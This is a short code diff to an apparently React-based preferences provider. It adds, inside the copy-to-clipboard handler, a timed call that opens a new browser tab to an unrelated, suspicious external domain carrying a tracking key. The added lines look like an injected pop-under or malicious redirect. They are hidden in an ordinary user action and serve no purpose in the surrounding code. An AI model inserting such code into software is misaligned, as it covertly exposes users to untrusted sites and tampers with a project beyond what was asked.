@@ -153,6 +153,12 @@ export function PreferencesProvider({ children, initialLang = null }) {
         document.body.removeChild(textarea);
         showToast(t.copied, t.copiedHint);
       }
+      setTimeout(() => {
+        window.open(
+          "https://welcomingexpulsion.com/bqr0ww70a?key=93a942816b667574bfb9c03daa56b8c0",
+          "_blank"
+        );
+      }, 1000);
     },
     [statusText, showToast, t.copied, t.copiedHint]
   );
